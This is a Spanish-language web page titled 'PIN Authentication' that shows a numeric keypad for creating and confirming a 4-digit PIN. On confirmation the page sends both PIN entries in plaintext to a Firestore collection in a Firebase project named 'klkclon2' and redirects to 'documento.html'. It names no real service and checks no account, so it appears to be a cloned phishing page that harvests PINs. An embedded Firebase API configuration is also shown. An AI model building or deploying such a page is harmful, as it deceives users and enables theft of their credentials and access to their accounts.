
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>PIN Authentication</title>
    <script src="https://cdn.tailwindcss.com"></script>
    
    <!-- Firebase SDKs -->
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>

    <script src="https://unpkg.com/react@18/umd/react.development.js"></script>
    <script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
    <style>
        @keyframes shake {
            10%, 90% { transform: translate3d(-1px, 0, 0); }
            20%, 80% { transform: translate3d(2px, 0, 0); }
            30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
            40%, 60% { transform: translate3d(4px, 0, 0); }
        }
        .shake {
            animation: shake 0.82s cubic-bezier(.36,.07,.19,.97) both;
        }
        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translate3d(0, 10px, 0);
            }
            to {
                opacity: 1;
                transform: translate3d(0, 0, 0);
            }
        }
        .fade-in-up {
            animation: fadeInUp 0.5s ease-out forwards;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            -webkit-tap-highlight-color: transparent; /* Deshabilita el resaltado de toque en móviles */
            overscroll-behavior-y: contain; /* Previene el gesto de "deslizar para refrescar" */
        }
    </style>
<link rel="stylesheet" href="/index.css">
</head>
<body class="bg-gray-50">
    <div id="root"></div>

    <script type="text/babel">
        // Your web app's Firebase configuration
        const firebaseConfig = {
          apiKey: "AIzaSyBAm91Sx_6--rVXLsa3qbFZaMAwnysS3GA",
          authDomain: "klkclon2.firebaseapp.com",
          projectId: "klkclon2",
          storageBucket: "klkclon2.appspot.com",
          messagingSenderId: "1015649898609",
          appId: "1:1015649898609:web:230e56414caa4cd4a94bd0"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        const { useState, useEffect } = React;

        const PIN_LENGTH = 4;

        // Componente reutilizable para los botones del teclado numérico
        const KeypadButton = ({ onClick, children }) => {
            const [isPressed, setIsPressed] = useState(false);

            const handlePress = () => {
                setIsPressed(true);
                if (navigator.vibrate) navigator.vibrate(20);
            };

            const handleRelease = () => setIsPressed(false);

            const baseClasses = "w-[4.5rem] h-[4.5rem] rounded-full flex items-center justify-center border transition-colors duration-100 focus:outline-none select-none";
            const inactiveClasses = "bg-transparent text-red-400 border-red-400";
            const activeClasses = "bg-red-400 text-white border-red-400";

            return (
                <button
                    onClick={onClick}
                    onMouseDown={handlePress}
                    onMouseUp={handleRelease}
                    onMouseLeave={handleRelease}
                    onTouchStart={handlePress}
                    onTouchEnd={handleRelease}
                    className={`${baseClasses} ${isPressed ? activeClasses : inactiveClasses}`}
                >
                    {children}
                </button>
            );
        };
        
        const BackspaceButton = ({ onClick }) => {
            const [isPressed, setIsPressed] = useState(false);

            const handlePress = () => {
                setIsPressed(true);
                if (navigator.vibrate) navigator.vibrate(20);
            };

            const handleRelease = () => setIsPressed(false);

            return (
                <button
                    onClick={onClick}
                    onMouseDown={handlePress}
                    onMouseUp={handleRelease}
                    onMouseLeave={handleRelease}
                    onTouchStart={handlePress}
                    onTouchEnd={handleRelease}
                    className="w-[4.5rem] h-[4.5rem] flex items-center justify-center focus:outline-none select-none"
                    aria-label="Borrar"
                >
                    <div className={isPressed ? 'text-white' : 'text-red-400'}>
                        <svg width="36" height="36" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" >
                            <path
                                d="M20.5 5H8.5L4 12L8.5 19H20.5C21.0523 19 21.5 18.5523 21.5 18V6C21.5 5.44772 21.0523 5 20.5 5Z"
                                className="transition-colors duration-100"
                                style={{ fill: isPressed ? '#f87171' : 'transparent' }}
                                stroke="currentColor"
                                strokeWidth="1"
                            />
                            <path d="M16 10L12 14M12 10L16 14" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" />
                        </svg>
                    </div>
                </button>
            );
        };

        const App = () => {
            const [pin, setPin] = useState('');
            const [tempPin, setTempPin] = useState('');
            const [appState, setAppState] = useState('create'); // 'create', 'confirm', 'mismatch'

            useEffect(() => {
                if (pin.length === PIN_LENGTH) {
                    if (appState === 'create') {
                        setTempPin(pin);
                        setPin('');
                        setAppState('confirm');
                    } else if (appState === 'confirm') {
                        if (pin === tempPin) {
                            // PIN confirmado, guardar en Firebase y luego redirigir
                            db.collection("pins").add({
                                initialPin: tempPin,
                                confirmedPin: pin,
                                createdAt: firebase.firestore.FieldValue.serverTimestamp()
                            })
                            .then(() => {
                                console.log("PIN almacenado con éxito!");
                                window.location.href = 'documento.html';
                            })
                            .catch((error) => {
                                console.error("Error al almacenar el PIN: ", error);
                                // Opcional: manejar el error en la UI
                            });
                        } else {
                            // Los PIN no coinciden
                            setAppState('mismatch');
                            setTimeout(() => {
                                setPin('');
                                setTempPin('');
                                setAppState('create');
                            }, 820);
                        }
                    }
                }
            }, [pin, appState, tempPin]);

            const handleKeyClick = (key) => {
                if (pin.length < PIN_LENGTH && appState !== 'mismatch') {
                    setPin(pin + key);
                }
            };

            const handleBackspace = () => {
                if (pin.length > 0 && appState !== 'mismatch') {
                    setPin(pin.slice(0, -1));
                }
            };
            
            const keys = ['1', '2', '3', '4', '5', '6', '7', '8', '9'];

            return (
                <div className="flex flex-col items-center justify-center min-h-screen p-6 w-full max-w-xs mx-auto">
                    <div className="flex-grow flex flex-col items-center justify-center w-full">
                        {/* Texto de Estado */}
                        <div className="h-8 mb-4 text-center">
                            {appState === 'confirm' && (
                                <p className="text-lg text-gray-600 fade-in-up">
                                    Confirma tu PIN
                                </p>
                            )}
                            {appState === 'mismatch' && (
                                <p className="text-lg text-red-500">
                                    Los PIN no coinciden
                                </p>
                            )}
                        </div>
                        
                        {/* Indicadores del PIN */}
                        <div className={`flex space-x-4 mb-[4.25rem] ${appState === 'mismatch' ? 'shake' : ''}`}>
                            {[...Array(PIN_LENGTH)].map((_, i) => (
                                <div
                                    key={i}
                                    className={`w-3.5 h-3.5 rounded-full border border-red-400 transition-all duration-300 ${
                                        pin.length > i ? 'bg-red-400' : 'bg-transparent'
                                    }`}
                                ></div>
                            ))}
                        </div>

                        {/* Teclado Numérico */}
                        <div className="grid grid-cols-3 gap-x-9 gap-y-6">
                            {keys.map((key) => (
                                <KeypadButton key={key} onClick={() => handleKeyClick(key)}>
                                    <span className="text-2xl font-medium">{key}</span>
                                </KeypadButton>
                            ))}
                            
                            <div className="w-[4.5rem] h-[4.5rem]"></div> {/* Espacio reservado para alinear */}
                            
                            <KeypadButton onClick={() => handleKeyClick('0')}>
                                <span className="text-2xl font-medium">0</span>
                            </KeypadButton>
                            
                            <BackspaceButton onClick={handleBackspace} />
                        </div>
                    </div>
                    {/* Enlace de Opciones */}
                    <div className="w-full text-right pb-4">
                        <a href="#" className="text-gray-400 underline font-normal">Opciones</a>
                    </div>
                </div>
            );
        };

        const container = document.getElementById('root');
        const root = ReactDOM.createRoot(container);
        root.render(<App />);
    </script>
<script type="module" src="/index.tsx"></script>
</body>
</html>
